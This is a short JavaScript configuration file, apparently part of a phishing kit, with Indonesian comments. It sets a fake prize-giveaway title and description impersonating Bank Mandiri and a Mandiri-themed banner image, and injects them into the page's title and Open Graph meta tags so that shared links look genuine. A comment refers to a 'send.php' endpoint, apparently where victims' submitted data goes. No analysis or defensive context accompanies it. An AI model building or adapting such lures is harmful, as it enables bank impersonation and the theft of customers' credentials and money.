// Judul/nama web
const APP_TITLE = "gbyar.dftar";
// Deskripsi web/iklan
const APP_DESC = "Dapatkan hadiah menarik dari Bank Mandiri buat kamu yang beruntung";
// URL banner gambar
const BANNER_URL = "https://xylhg.github.io/links/banners/link_preview_mandiri.jpg";
// URL API (tempat dimana file send.php ditaruh, kosongkan jika file send.php ditaruh di halaman depan/root)
const API_URL = "";

export { APP_TITLE, APP_DESC, BANNER_URL, API_URL }

$(document).ready(function() {
	$("title").html(APP_TITLE);
	$('meta[property="og:site_name"]').attr('content', APP_TITLE);
	$('meta[property="og:title"]').attr('content', APP_TITLE);
	$('meta[property="description"]').attr('content', APP_DESC);
	$('meta[property="og:description"]').attr('content', APP_DESC);
	$('meta[property="og:image"]').attr('content', BANNER_URL);
});